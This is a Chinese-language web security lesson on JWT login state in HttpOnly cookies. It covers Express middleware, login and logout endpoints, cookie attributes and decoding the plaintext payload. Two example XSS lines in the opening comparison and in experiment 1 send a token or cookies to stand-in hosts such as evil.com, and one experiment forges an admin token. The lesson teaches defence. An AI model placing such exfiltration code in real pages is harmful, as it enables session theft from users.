# 第 52 节课：登录状态——Cookie 里到底放了什么

> **这份文件是你（学员）一步一步照着做的手册。**
> 今天你要亲手签发一个 JWT，放进 Cookie，然后**把它解码出来看看里面到底有什么**。
> 看完你就再也不会把邮箱、手机号塞进 token 里了。

**建议用时**：140 分钟
**你需要先完成**：第 51 节课（`token_version` 字段已加，重置流程能跑）

---

# 第 0 步：四种"记住我登录"的方式（15 分钟）

## 0.1 先摆出来对比

| 方式 | 存哪 | XSS 能偷 | 自动发送 | 复杂度 |
|---|---|---|---|---|
| **localStorage 存 token** | 浏览器 JS 可读 | ✅ 能 | ❌ 要手写 header | 低 |
| **Session Cookie（服务端 session）** | 服务端内存/库 | ❌ 不能 | ✅ 自动 | 中 |
| **JWT 放 HttpOnly Cookie** | 浏览器自动管理 | ❌ 不能 | ✅ 自动 | 中 |
| **JWT 放 localStorage** | 浏览器 JS 可读 | ✅ 能 | ❌ 要手写 | 低 |

**这一周选第三种：JWT 放 HttpOnly Cookie。**

**为什么不用第一种和第四种：**

**XSS（跨站脚本）是最常见的漏洞之一。** 只要你的页面里有一处把用户输入当 HTML 渲染了，攻击者就能注入：

```html
<script>
  fetch("https://evil.com/steal?t=" + localStorage.getItem("token"))
</script>
```

**`localStorage.getItem()` 一行就偷走了。** 而 HttpOnly Cookie **JS 根本读不到**。

**为什么不用第二种（服务端 session）：**

**它能用，而且更简单（一个随机 id 存服务端）。**

**但：**

```text
① 多实例部署时 session 要共享（要 Redis 或数据库）
② 第 24 周多租户、第 29 周 Docker 都会遇到这个
③ JWT 是无状态的，扩展性好
```

**这一周教 JWT，但你要知道 session 也是一种正当选择。** 它的"能立即踢人"比 JWT 强。

## 0.2 三种存储位置的取舍，说清楚

**没有"最好"的，只有"权衡"。**

```text
HttpOnly Cookie：
  + 防 XSS 窃取
  + 自动发送
  - 需要防 CSRF（跨站请求伪造）
  - 跨域配置麻烦

localStorage：
  + 跨域简单
  + 移动端友好
  - XSS 一偷就没
  - 要手写 Authorization header

内存变量（不持久）：
  + 最安全（关页面就没了）
  - 刷新就掉登录，体验差
```

**本课程选 Cookie + JWT，然后第 55 节用"表单 token"防 CSRF。**

## 0.3 今天的交付物

| 文件 | 位置（都在 `auth-lab` 里） | 内容 |
|---|---|---|
| `src/auth.js` | `src/` | 签发/校验 JWT + 中间件 |
| `src/app.js` | `src/` | 加登录、登出、`/api/me` |
| `experiments/e03-jwt.js` | `experiments/` | 解码自己的 token |
| `public/login.html` | `public/` | 登录页 |
| `public/app.html` | `public/` | 登录后才能看的页面 |

---

# 第 1 步：写 JWT 工具（30 分钟）

## 1.1 先搞清 JWT 的结构

**一个 JWT 长这样（三段，用 `.` 分隔）：**

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsImlhdCI6MTcwMDAwMDAwMH0.abc123...
└──────────── header ────────────┘└────────── payload ──────────┘└─ signature ─┘
```

**三段的内容：**

| 段 | 内容 | 是否加密 |
|---|---|---|
| Header | `{"alg":"HS256","typ":"JWT"}` | ❌ 只是 Base64 |
| Payload | `{"uid":1,"iat":...}` | ❌ **只是 Base64** |
| Signature | 用密钥对前两段做 HMAC | ✅ 无法伪造 |

**关键认知：**

> **Payload 是明文。** 你把 token 贴到 jwt.io，或者跑一行 Base64 解码，就能看到全部内容。
>
> **Signature 保证的是"没被篡改"，不是"看不到"。**

**马上验证。** 新建 `experiments/e03-jwt.js`：

```javascript
import jwt from "jsonwebtoken";
import { CONFIG } from "../src/config.js";

const TOKEN = jwt.sign({ uid: 1, email: "test1@example.com", role: "user" }, CONFIG.jwt.secret, {
  expiresIn: "7d",
});

console.log("完整 token：\n", TOKEN, "\n");

const [header, payload, signature] = TOKEN.split(".");

console.log("Header（Base64）：", header);
console.log("Header（解码）：", Buffer.from(header, "base64url").toString("utf8"));
console.log();

console.log("Payload（Base64）：", payload);
console.log("Payload（解码）：", Buffer.from(payload, "base64url").toString("utf8"));
console.log();

console.log("Signature：", signature);
console.log("Signature 无法解码，它是 HMAC 的产物\n");

// 关键实验：篡改 payload
const tampered = Buffer.from(
  JSON.stringify({ uid: 999, role: "admin", iat: Math.floor(Date.now() / 1000) })
).toString("base64url");

const fakeToken = `${header}.${tampered}.${signature}`;

console.log("篡改后的 payload：", Buffer.from(tampered, "base64url").toString("utf8"));
console.log("用篡改的 token 验证：");

try {
  const decoded = jwt.verify(fakeToken, CONFIG.jwt.secret);
  console.log("  ⚠️ 竟然通过了：", decoded);
} catch (error) {
  console.log(`  ✅ 被拒绝：${error.message}`);
}
```

**加脚本：**

```json
    "e03:jwt": "node --env-file=.env experiments/e03-jwt.js"
```

**跑：**

```text
npm run e03:jwt
```

**你会看到：**

```text
Payload（解码）： {"uid":1,"email":"test1@example.com","role":"user","iat":...}
```

**邮箱明文在 token 里。**

**任何人拿到你的 token（浏览器 F12、网络面板、日志、代理），就看到了用户的邮箱。**

## 1.2 三个必须记住的结论

### 结论一：payload 只放"不敏感 + 不常变"的东西

**能放的：**

```text
uid          用户 id（数字，不敏感）
role         角色（本来就不是秘密）
ver          token 版本（第 51 节的防踢人）
iat / exp    签发/过期时间（自动）
```

**不能放的：**

```text
❌ 邮箱、手机号、身份证（个人隐私）
❌ 密码哈希（绝对不能）
❌ 内部权限规则（"他是 VIP，可以看 100 条"）
❌ 余额、额度（会变，JWT 里是快照）
```

**为什么"会变的"不能放：**

```text
用户充了钱 → 额度从 10 变 1000
但他手上的 JWT 里还是 10
要等 7 天后重新登录才生效
```

**额度、余额、权限明细，每次请求都从数据库查。**

### 结论二：签名保证"没被改"，不保证"没被看"

**上一段的实验已经证明：改了 payload 签名就失效。**

**但它不能阻止别人看 payload。**

**加密 JWT（JWE）是另一套标准，复杂得多，这一周不涉及。**

### 结论三：`exp` 是必须的

**不设过期时间的 JWT 是"永久钥匙"。**

**一旦泄露，攻击者能用到你改密钥为止。**

**这一周设 7 天。** 更严格的做法：

```text
access token  15 分钟（放内存或 Cookie）
refresh token 7 天（只用来换 access token）
```

**这是"双 token"方案。** 第 24 周会用到。今天先单 token，够用。

## 1.3 新建 `src/auth.js`

```javascript
import jwt from "jsonwebtoken";
import { CONFIG } from "./config.js";
import { findById, toPublicUser } from "./users.js";

const COOKIE_NAME = CONFIG.jwt.cookieName;

export const signToken = (user) =>
  jwt.sign(
    {
      uid: user.id,
      role: user.role,
      ver: user.token_version ?? 1,
    },
    CONFIG.jwt.secret,
    {
      expiresIn: CONFIG.jwt.expiresIn,
      issuer: "auth-lab",
    }
  );

export const verifyToken = (token) => {
  try {
    return { ok: true, payload: jwt.verify(token, CONFIG.jwt.secret, { issuer: "auth-lab" }) };
  } catch (error) {
    const reason =
      error.name === "TokenExpiredError"
        ? "EXPIRED"
        : error.name === "JsonWebTokenError"
          ? "INVALID"
          : "UNKNOWN";

    return { ok: false, reason };
  }
};

/**
 * Cookie 选项。四个属性各有作用，一个都不能少。
 */
export const cookieOptions = () => ({
  httpOnly: true,                                  // JS 读不到
  sameSite: "lax",                                 // 防跨站 POST
  secure: CONFIG.env === "production",             // 生产必须 HTTPS
  maxAge: 7 * 24 * 3600 * 1000,                    // 7 天，和 JWT 一致
  path: "/",
});

export const setAuthCookie = (res, token) => {
  res.cookie(COOKIE_NAME, token, cookieOptions());
};

export const clearAuthCookie = (res) => {
  res.clearCookie(COOKIE_NAME, { ...cookieOptions(), maxAge: undefined });
};

/**
 * 认证中间件：读 Cookie → 验 JWT → 查用户 → 挂到 req.user
 */
export const requireAuth = (req, res, next) => {
  const token = req.cookies?.[COOKIE_NAME];

  if (!token) {
    return res.status(401).json({ error: "请先登录", code: "NO_TOKEN" });
  }

  const result = verifyToken(token);

  if (!result.ok) {
    clearAuthCookie(res);

    return res.status(401).json({
      error: result.reason === "EXPIRED" ? "登录已过期，请重新登录" : "登录状态无效",
      code: result.reason,
    });
  }

  const user = findById(result.payload.uid);

  if (!user) {
    clearAuthCookie(res);
    return res.status(401).json({ error: "账号不存在", code: "NO_USER" });
  }

  if (user.status !== "active") {
    clearAuthCookie(res);
    return res.status(403).json({ error: "账号已被禁用", code: "DISABLED" });
  }

  // 关键：token 版本比对（第 51 节埋的）
  if ((result.payload.ver ?? 1) !== (user.token_version ?? 1)) {
    clearAuthCookie(res);
    return res.status(401).json({ error: "登录已失效，请重新登录", code: "STALE_TOKEN" });
  }

  req.user = toPublicUser(user);
  req.auth = { payload: result.payload };
  next();
};

/** 可选认证：有 token 就解析，没 token 也放行 */
export const optionalAuth = (req, res, next) => {
  const token = req.cookies?.[COOKIE_NAME];
  if (!token) return next();

  const result = verifyToken(token);
  if (!result.ok) return next();

  const user = findById(result.payload.uid);
  if (!user || user.status !== "active") return next();

  req.user = toPublicUser(user);
  next();
};
```

## 1.4 逐条讲讲为什么

### `httpOnly: true`

**JS 读不到 `document.cookie` 里的这一项。**

**这是防 XSS 窃取的唯一手段。**

**验证方法（做完一定要试）：**

```javascript
// 在浏览器控制台
document.cookie
// 应该看不到 auth_token
```

### `sameSite: "lax"`

**三个值：**

| 值 | 行为 | 适用 |
|---|---|---|
| `strict` | 任何跨站请求都不带 Cookie | 最严，但用户从搜索引擎点进来会掉登录 |
| `lax` | 跨站的 GET 导航带，POST 不带 | **默认推荐** |
| `none` | 都带（必须配 `secure`） | 前后端跨域部署时 |

**`lax` 挡住了什么：**

```text
恶意网站自动提交表单 POST 到你的接口 → 不带 Cookie → 401
```

**`lax` 没挡住什么：**

```text
恶意网站用 <img src="https://你的站/api/delete?id=1">  GET 请求 → 带 Cookie
```

**所以：所有"会改数据"的操作必须用 POST/PUT/DELETE，不能用 GET。**

**这是一条硬规则。**

### `secure: CONFIG.env === "production"`

**`secure: true` 意味着"只在 HTTPS 下发送"。**

**开发时你是 `http://localhost`，设 `true` 会导致 Cookie 根本发不出去 —— 你会以为登录坏了。**

**所以按环境切换。**

**生产环境必须 `true`。** 不设的话，Cookie 会在 HTTP 下明文传输，被中间人抓走。

### `maxAge` 和 JWT 的 `exp` 要一致

**两个都要设，而且值一样。**

**为什么不一致会出问题：**

```text
Cookie 7 天，JWT 1 天
→ 第 2 天：Cookie 还在，但 JWT 过期 → 每次都 401 → 用户看到"莫名其妙的掉登录"

Cookie 1 天，JWT 7 天
→ 第 2 天：Cookie 没了，但 token 还能用（如果有人保存了）
→ 实际体验是"1 天掉登录"，但泄露的 token 7 天内都有效
```

**保持一致，行为可预测。**

### `ver` 版本比对

```javascript
if ((result.payload.ver ?? 1) !== (user.token_version ?? 1)) {
  return res.status(401).json({ code: "STALE_TOKEN" });
}
```

**这就是"改密码后踢掉所有设备"的实现。**

**代价：每次请求多一次数据库查询。**

**值得吗：**

```text
不值得的情况：纯读接口，QPS 很高
值得的情况：能改数据、能花钱的接口
```

**这一周所有受保护接口都查。** 第 22 周讲性能时会讲"什么时候可以省掉这次查询"。

---

# 第 2 步：写登录接口（25 分钟）

## 2.1 在 `app.js` 里加

```javascript
import bcrypt from "bcryptjs";
import { findByEmail, toPublicUser } from "./users.js";
import { prehashIfNeeded } from "./password.js";
import { signToken, setAuthCookie, clearAuthCookie, requireAuth } from "./auth.js";

// 用户不存在时用来"消耗同样的时间"（防计时攻击）
const DUMMY_HASH = "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy";

app.post("/api/login", async (req, res) => {
  const { email, password } = req.body ?? {};

  if (typeof email !== "string" || typeof password !== "string") {
    return res.status(400).json({ error: "邮箱和密码必须是字符串" });
  }

  if (password.length > 200) {
    return res.status(400).json({ error: "密码过长" });
  }

  const user = findByEmail(email);

  // 关键：用户不存在时也跑一次哈希比对，消除时间差
  if (!user) {
    await bcrypt.compare(prehashIfNeeded(password), DUMMY_HASH).catch(() => {});
    return res.status(401).json({ error: "邮箱或密码错误" });
  }

  if (user.status !== "active") {
    // 注意：这里也不能说"账号被禁用"？
    // 可以说。因为攻击者已经知道这个邮箱存在了（他刚验证了密码）
    // 实际上这里还没验证密码，所以还是统一回复更安全
    return res.status(401).json({ error: "邮箱或密码错误" });
  }

  const match = await bcrypt.compare(prehashIfNeeded(password), user.password_hash);

  if (!match) {
    return res.status(401).json({ error: "邮箱或密码错误" });
  }

  const token = signToken(user);
  setAuthCookie(res, token);

  console.log(`[login] uid=${user.id} 登录成功`);

  res.json({
    message: "登录成功",
    user: toPublicUser(user),
  });
});

app.post("/api/logout", (req, res) => {
  clearAuthCookie(res);
  res.json({ message: "已登出" });
});

app.get("/api/me", requireAuth, (req, res) => {
  res.json({ user: req.user });
});
```

## 2.2 四个关键设计

### 设计一：所有失败都说"邮箱或密码错误"

```javascript
if (!user) → "邮箱或密码错误"
if (!match) → "邮箱或密码错误"
if (status !== "active") → "邮箱或密码错误"
```

**三种情况同一个回复。**

**为什么 `status !== "active"` 也不说"被禁用"：**

```text
如果他真的是这个账号的主人，他会知道（客服会告诉他）
如果是攻击者，你告诉他"这个账号存在但被禁用了" → 他知道了这个邮箱注册过
```

**代价：被封的用户会困惑。**

**折中方案（真实产品常见）：**

**先验证密码，密码对了再说"账号已被禁用"。**

**因为"密码对了"已经证明他是主人。**

**今天的写法是安全的但不够友好。练习里会让你改进。**

### 设计二：`DUMMY_HASH` 消除时间差

**已经说过。补一点：**

**`DUMMY_HASH` 必须是一个"格式合法但永不匹配"的 bcrypt 哈希。**

**上面那个字符串是我随手编的格式，实际用：**

```javascript
const DUMMY_HASH = await bcrypt.hash("dummy-password-never-matches", 10);
```

**在模块加载时算一次，然后复用。**

**注意：`prehashIfNeeded(password)` 要一起用，否则长度不同的密码耗时还是不一样。**

### 设计三：登录成功后重建 Cookie

**如果用户之前有个旧 token（比如换账号），`setAuthCookie` 会覆盖。**

**`res.cookie()` 同名会覆盖，不用先 clear。**

### 设计四：`/api/me` 是最简单的"我登录了吗"检查

**前端可以用它判断：**

```javascript
const res = await fetch("/api/me");
if (res.status === 401) → 显示登录页
else → 进入应用
```

**为什么不用"检查有没有 Cookie"：**

**`document.cookie` 读不到 HttpOnly Cookie。** 所以前端根本不知道有没有登录，**必须问服务端**。

**这正是 HttpOnly 的作用。**

---

# 第 3 步：写前端（25 分钟）

## 3.1 `public/login.html`

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>登录</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; margin: 0; background: #f5f6f8; color: #16181d;
    }
    form {
      width: 360px; background: #fff; padding: 28px;
      border: 1px solid #e5e7eb; border-radius: 12px;
    }
    h1 { font-size: 18px; margin: 0 0 20px; font-weight: 600; }
    label { display: block; font-size: 13px; color: #4b5563; margin: 14px 0 6px; }
    input {
      width: 100%; padding: 10px 12px; font: inherit;
      border: 1px solid #d1d5db; border-radius: 8px;
    }
    button {
      width: 100%; margin-top: 20px; padding: 11px;
      font: inherit; font-weight: 500; border: none; border-radius: 8px;
      background: #1a6dff; color: #fff; cursor: pointer;
    }
    button:disabled { background: #a9c1e8; }
    .msg { margin-top: 14px; font-size: 13px; min-height: 18px; }
    .msg.err { color: #b91c1c; }
    .msg.ok { color: #15803d; }
    .foot { margin-top: 16px; font-size: 13px; text-align: center; color: #6b7280; }
    .foot a { color: #1a6dff; text-decoration: none; }
  </style>
</head>
<body>
  <form id="form" novalidate>
    <h1>登录</h1>

    <label for="email">邮箱</label>
    <input id="email" name="email" type="email" autocomplete="username" required />

    <label for="password">密码</label>
    <input id="password" name="password" type="password" autocomplete="current-password" required />

    <button id="submit" type="submit">登录</button>
    <div class="msg" id="msg"></div>

    <div class="foot">
      没有账号？<a href="/register.html">去注册</a>　·　
      <a href="/forgot.html">忘记密码</a>
    </div>
  </form>

  <script>
    const form = document.getElementById("form");
    const msg = document.getElementById("msg");
    const submit = document.getElementById("submit");

    const show = (text, type) => {
      msg.textContent = text;
      msg.className = `msg ${type}`;
    };

    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      submit.disabled = true;
      show("正在登录……", "");

      try {
        const response = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "same-origin",
          body: JSON.stringify({
            email: form.email.value,
            password: form.password.value,
          }),
        });

        const data = await response.json().catch(() => ({}));

        if (!response.ok) {
          show(data.error || "登录失败", "err");
          return;
        }

        show("登录成功，正在进入……", "ok");
        setTimeout(() => {
          window.location.href = "/app.html";
        }, 500);
      } catch (error) {
        show(`网络错误：${error.message}`, "err");
      } finally {
        submit.disabled = false;
      }
    });
  </script>
</body>
</html>
```

**注意 `autocomplete="current-password"`。** 注册用 `new-password`，登录用 `current-password`。写反了密码管理器会填错。

## 3.2 `public/app.html`

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>我的应用</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
      max-width: 640px; margin: 40px auto; padding: 0 20px;
      background: #f5f6f8; color: #16181d;
    }
    .bar {
      display: flex; justify-content: space-between; align-items: center;
      background: #fff; padding: 14px 18px; border: 1px solid #e5e7eb;
      border-radius: 12px; margin-bottom: 16px;
    }
    .bar .name { font-weight: 600; }
    .bar .meta { font-size: 12px; color: #6b7280; margin-top: 2px; }
    button {
      padding: 8px 16px; font: inherit; border: 1px solid #d1d5db;
      border-radius: 8px; background: #fff; cursor: pointer;
    }
    .card {
      background: #fff; padding: 18px; border: 1px solid #e5e7eb;
      border-radius: 12px;
    }
    pre {
      background: #f8f9fa; padding: 12px; border-radius: 8px;
      font-size: 12px; overflow: auto;
    }
    .deny { color: #b91c1c; }
  </style>
</head>
<body>
  <div class="bar">
    <div>
      <div class="name" id="name">加载中……</div>
      <div class="meta" id="meta"></div>
    </div>
    <button id="logout">登出</button>
  </div>

  <div class="card">
    <div style="font-size:13px;color:#6b7280;margin-bottom:8px">
      当前登录用户的 API 返回：
    </div>
    <pre id="me">加载中……</pre>
  </div>

  <script>
    const nameEl = document.getElementById("name");
    const metaEl = document.getElementById("meta");
    const meEl = document.getElementById("me");

    const load = async () => {
      try {
        const response = await fetch("/api/me", { credentials: "same-origin" });

        if (response.status === 401) {
          window.location.href = "/login.html";
          return;
        }

        const data = await response.json();
        nameEl.textContent = data.user.nickname || data.user.email;
        metaEl.textContent = `uid ${data.user.id} · 角色 ${data.user.role}`;
        meEl.textContent = JSON.stringify(data, null, 2);
      } catch (error) {
        meEl.textContent = `请求失败：${error.message}`;
      }
    };

    document.getElementById("logout").addEventListener("click", async () => {
      await fetch("/api/logout", { method: "POST", credentials: "same-origin" });
      window.location.href = "/login.html";
    });

    load();
  </script>
</body>
</html>
```

## 3.3 三个关键点

### 关键点一：`credentials: "same-origin"`

**为什么需要：**

```text
fetch 默认不发送跨源 Cookie
"same-origin" → 同源时带 Cookie（我们就是同源）
"include"    → 跨源也带（需要服务端配 CORS + credentials）
```

**不加这个，Cookie 发不出去，你会以为"登录没成功"。**

**这是一个必踩的坑。**

### 关键点二：`/api/me` 返回 401 就跳登录

**这是最标准的"路由守卫"实现。**

**为什么不用前端判断"有没有 token"：**

**HttpOnly Cookie 前端读不到。** 必须问服务端。

### 关键点三：登出必须调接口

**不能只跳转页面。**

```javascript
// 错的
window.location.href = "/login.html";   // Cookie 还在！

// 对的
await fetch("/api/logout", { method: "POST" });
window.location.href = "/login.html";
```

**不调接口，Cookie 还在浏览器里，用户下次访问直接就是登录状态。**

## 3.4 跑一遍完整流程

**1. 启动服务：**

```text
npm run dev
```

**2. 注册一个账号**（如果还没有）：

```text
http://localhost:4030/register.html
```

**3. 登录：**

```text
http://localhost:4030/login.html
```

**4. 应该跳到 `app.html`，看到自己的邮箱。**

**5. 刷新页面，还是登录状态。**

**6. 打开 F12 → Application → Cookies，看 `auth_token`。**

**你应该看到：**

```text
Name: auth_token
Value: eyJhbGciOiJIUzI1NiIs...
HttpOnly: ✓ (有一个勾)
Secure: ✗ (开发环境)
SameSite: Lax
```

**HttpOnly 那一栏是勾选状态。**

**7. 在 Console 里跑：**

```javascript
document.cookie
```

**输出应该是空字符串（或者没有 `auth_token`）。**

**这就是 HttpOnly 生效了。**

---

# 第 4 步：验证 payload 里有什么（20 分钟）

**打开 F12 → Application → Cookies → 复制 `auth_token` 的值。**

**然后跑：**

```text
node -e "const t='粘贴token';const p=t.split('.')[1];console.log(Buffer.from(p,'base64url').toString())"
```

**你会看到：**

```json
{"uid":1,"role":"user","ver":1,"iat":1794900000,"exp":1795504800,"iss":"auth-lab"}
```

**六个字段，逐个说：**

| 字段 | 值 | 是否敏感 |
|---|---|---|
| `uid` | 1 | 否（数字） |
| `role` | user | 否（角色名不是秘密） |
| `ver` | 1 | 否（版本号） |
| `iat` | 签发时间 | 否 |
| `exp` | 过期时间 | 否 |
| `iss` | 签发者 | 否 |

**没有一个敏感字段。**

**这就是正确的设计。**

## 4.1 一个对照：故意放敏感信息

**临时改 `signToken`：**

```javascript
{
  uid: user.id,
  email: user.email,        // ← 加了
  phone: "13800138000",     // ← 加了
}
```

**重新登录，解码 token。**

**你会看到邮箱和手机号明文在里面。**

**想想：**

```text
① 这个 token 会出现在浏览器 Cookie 里
② 会出现在你的 Nginx access log 里（如果配了记录 Cookie）
③ 会出现在代理工具的抓包里
④ 会出现在别人的截图里
```

**然后改回来。**

**这个实验的目的：让你以后看到"有人把邮箱塞进 JWT"时，能立刻指出问题。**

---

# 第 5 步：五个必须知道的坑（20 分钟）

## 坑 1：`credentials: "same-origin"` 忘了写

**症状：登录接口返回 200，但跳转后 `/api/me` 是 401。**

**原因：** 登录时服务端设了 Cookie（响应里有 `Set-Cookie`），但后续请求没带。

**排查：**

```text
F12 → Network → 看登录响应的 Headers → 有没有 Set-Cookie
F12 → Network → 看 /api/me 请求的 Headers → 有没有 Cookie
```

**第一种有、第二种没有 → 前端 `fetch` 少了 `credentials`。**

## 坑 2：`secure: true` 在 http 下导致 Cookie 被丢弃

**症状：** 设了 `Set-Cookie`，但浏览器不存。

**F12 → Application → Cookies 里看不到。**

**原因：** `secure: true` 的 Cookie 只在 HTTPS 下保存/发送。

**修法：**

```javascript
secure: CONFIG.env === "production"
```

**这一条已经写了。**

## 坑 3：`sameSite: "lax"` 导致跨域 POST 丢 Cookie

**场景：前端在 5173，后端在 4030。**

**两个端口 = 两个源 = 跨站。**

**`lax` 不会在 POST 时带 Cookie。**

**修法（三选一）：**

```text
A. 前后端同源（Express 发 public/，就是这一周的做法）
B. 用 Vite 的 proxy 把 /api 代理到后端（同源）
C. sameSite: "none" + secure + HTTPS（需要证书）
```

**推荐 A 或 B。C 在开发环境很麻烦。**

## 坑 4：登出没清 Cookie

```javascript
app.post("/api/logout", (req, res) => {
  res.json({ message: "已登出" });   // ← 忘了 clearAuthCookie
});
```

**症状：** 用户点登出，跳到登录页，但改地址栏访问 `/app.html` **还是登录状态**。

**这就是"我登出了但没登出"。**

**`clearAuthCookie` 必须在。**

**验证方法：登出后看 F12 → Cookies，`auth_token` 应该消失。**

## 坑 5：JWT 的 `exp` 和 Cookie 的 `maxAge` 不一致

**现象：**

```text
Cookie 7 天，JWT 1 小时
→ 1 小时后，用户仍在"已登录"状态（Cookie 还在），但每个请求都 401
→ 用户看到"莫名其妙的错误"，不知道要重新登录
```

**修法：**

```text
两者保持一致
AND 在 401 的时候 clearAuthCookie（已经做了）
AND 前端遇到 401 自动跳登录页
```

**这样用户至少能"自动跳登录"，不会卡住。**

---

# 第 6 步：故意做五个实验（20 分钟）

## 实验 1：把 `httpOnly` 改成 `false`

**重新登录，然后 Console 跑：**

```javascript
document.cookie
```

**你能看到 `auth_token` 的完整值。**

**再跑：**

```javascript
fetch("https://evil.example.com/steal?t=" + document.cookie)
```

**这就是 XSS 窃取的完整路径。**

**改回 `true`。**

## 实验 2：把 `sameSite` 改成 `"none"` 但不加 `secure`

**浏览器会拒绝这个 Cookie（Chrome 有明确警告）。**

**看 Console 的警告信息。**

**这让你理解：`sameSite: "none"` 必须配 `secure: true`。**

**改回来。**

## 实验 3：改密码后不递增 `token_version`

**临时把 `changePassword` 里的 `token_version + 1` 去掉。**

**然后：**

```text
① 在浏览器 A 登录
② 用 curl 改密码（或者用另一个浏览器）
③ 回到浏览器 A，刷新 → 还是登录状态
```

**这就是"改密码不能踢人"。**

**改回来，再试一次，应该立刻掉登录。**

## 实验 4：手动改 Cookie 的值

**F12 → Cookies → 把 `auth_token` 的值改一个字符（比如最后一位）。**

**刷新页面。**

**应该立刻 401 并跳登录页。**

**因为签名校验失败。**

## 实验 5：把 payload 改成 `admin`

**用 `e03:jwt.js` 里的方法，改 payload 里的 `role` 为 `admin`，签名不变。**

**用它替换浏览器里的 Cookie。**

**刷新。**

**应该被拒绝（签名不匹配）。**

**结论：JWT 的 payload 无法篡改，但能被读取。**

**这两件事必须同时记住。**

---

# 第 7 步：写笔记（10 分钟）

**`NOTES.md` 必填：**

1. 你的 token 解码后的完整 payload
2. Cookie 的四个属性各自防什么
3. 五个实验的现象
4. 「卡在哪」

---

# 第 8 步：课后练习

## 练习一：加"记住我"

**要求：** 登录页加一个复选框。

```text
勾选 → Cookie maxAge 30 天，JWT 30 天
不勾 → Cookie 不设 maxAge（会话 Cookie，关浏览器就没了），JWT 1 天
```

**注意两个值要一致。**

**为什么这个功能值得做：** 用户在个人电脑上想"别老让我登录"，在公共电脑上想"关掉就没"。

## 练习二：改进"账号被禁用"的提示

**要求：** 先验证密码，密码对了再告诉用户"账号已被禁用，请联系客服"。

**代码：**

```javascript
const match = await bcrypt.compare(...);
if (!match) return res.status(401).json({ error: "邮箱或密码错误" });

// 密码对了，才说真实原因
if (user.status !== "active") {
  return res.status(403).json({ error: "账号已被禁用，请联系客服" });
}
```

**为什么这样安全：**

**攻击者必须先猜对密码，才拿到"被禁用"这个信息。既然他能猜对密码，他已经赢了，多知道一个信息无所谓。**

## 练习三：加 token 刷新

**要求：** `/api/refresh`，用现有一个未过期的 token 换一个新的（延长 7 天）。

```javascript
app.post("/api/refresh", requireAuth, (req, res) => {
  const user = findById(req.user.id);
  setAuthCookie(res, signToken(user));
  res.json({ message: "已刷新" });
});
```

**调用时机：** 前端在每次操作前检查 token 剩余时间，快过期时静默刷新。

**注意：这个接口要限频**（第 54 节）。

## 练习四：想清楚这四个问题

```text
1. 为什么 localStorage 存 token 比 HttpOnly Cookie 危险？
2. `sameSite=lax` 挡住了什么，没挡住什么？
3. JWT 的 payload 为什么"不能加密"也要"能防篡改"？
4. 登出为什么必须调接口，不能只跳页面？
```

---

# 第 9 步：最终验收

## A. 代码

- [ ] `auth.js` 有 `signToken` / `verifyToken` / `requireAuth` / `optionalAuth`
- [ ] `signToken` 的 payload 只有 `uid` / `role` / `ver`
- [ ] `cookieOptions` 四个属性齐全
- [ ] `requireAuth` 检查了 `ver`
- [ ] 所有 401 都 `clearAuthCookie`
- [ ] `app.js` 有 login / logout / me

## B. 前端

- [ ] login.html 有 `credentials: "same-origin"`
- [ ] app.html 遇到 401 会跳登录
- [ ] 登出会调 `/api/logout`

## C. 实测

- [ ] 登录后刷新页面还保持登录
- [ ] `document.cookie` 看不到 `auth_token`
- [ ] 解码 token 只看到六个字段，无敏感信息
- [ ] 改 Cookie 一个字符会 401
- [ ] 改密码后旧 token 立刻失效
- [ ] 登出后 Cookie 消失

## D. 认知

- [ ] 我能说清四种存储位置的取舍
- [ ] 我知道 `sameSite` 三个值的区别
- [ ] 我知道 `secure` 在 http 下会让 Cookie 失效
- [ ] 我知道 payload 是明文

## 本节课要能说出口的一句话

> **JWT 的 payload 是明文，所以只放 uid。登录状态靠 HttpOnly Cookie，因为 JS 读不到就等于偷不走。**

---

# 附：常见问题速查

| 情况 | 原因 | 怎么做 |
|---|---|---|
| 登录成功但 `/api/me` 401 | 前端没带 Cookie | 加 `credentials: "same-origin"` |
| Cookie 存不进去 | `secure: true` + http | 按环境切换 |
| 跨域 POST 丢 Cookie | `sameSite: "lax"` | 同源部署或 `none + secure` |
| 登出后还登录 | 没清 Cookie | `clearAuthCookie` |
| 改密码不踢人 | 没检查 `ver` | 加版本比对 |
| `TokenExpiredError` | 过期了 | 正常，跳登录 |
| `invalid signature` | 密钥不一致 / 被篡改 | 检查 `.env` |
| `jwt malformed` | token 格式错 | 检查 Cookie 值是否完整 |
| 文档里看不到 Cookie | HttpOnly | 这是对的，用 Network 面板看 |
| 多标签页登录状态不同步 | 各自缓存的用户信息 | 用 `/api/me` 每次重新拉 |
